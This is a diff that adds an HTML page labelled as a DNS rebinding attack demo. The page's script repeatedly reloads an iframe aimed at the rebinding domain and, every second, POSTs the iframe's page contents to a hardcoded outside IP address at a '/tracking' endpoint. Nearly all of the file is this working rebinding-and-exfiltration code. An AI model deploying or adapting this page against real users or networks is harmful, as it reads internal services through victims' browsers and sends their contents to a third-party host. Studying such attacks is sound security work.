@@ -1,0 +1,60 @@
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <title>DNS Rebinding Attack - DEMO</title>
+</head>
+
+<body>
+    <h1>DNS Rebinding Attack - DEMO</h1>
+
+    <h2>
+        Before Host: <mark>{{rebind_info['first_host']}}</mark>
+        After Host: <mark>{{rebind_info['target_host']}}</mark>
+    </h2>
+
+    <h3>
+        <span>Cache Timer: </span>
+        <span id="timer">60 s</span>
+    </h3>
+
+    <iframe src="/" id="iframe" style="width:500px;height:500px;"></iframe>
+    
+</body>
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        let timerElement = document.getElementById('timer');
+        let iframElement = document.getElementById('iframe');
+        let resultElement = document.getElementById('result');
+        let timeLeft = parseInt(timerElement.textContent, 10);
+
+        const countdown = setInterval(() => {
+            if (timeLeft > 0) {
+                timeLeft--;
+                timerElement.textContent = timeLeft + " s";
+
+                // Change color based on remaining time
+                if (timeLeft <= 10) {
+                    timerElement.style.color = 'red';
+                } else {
+                    timerElement.style.color = 'black';
+                }
+
+            } else {
+                timerElement.textContent = "Domain Cache Reset";
+            }
+            // Refresh iframe
+            iframElement.src = "/";
+            fetch("http://43.201.55.87/tracking", {
+                method: "POST",
+                mode: "no-cors",
+                headers: {
+                    'Content-Type': 'text/plain'
+                },
+                body: JSON.stringify({"data":iframElement.contentDocument.body.innerHTML})
+            })
+        }, 1000);
+    });
+</script>
+
+</html>
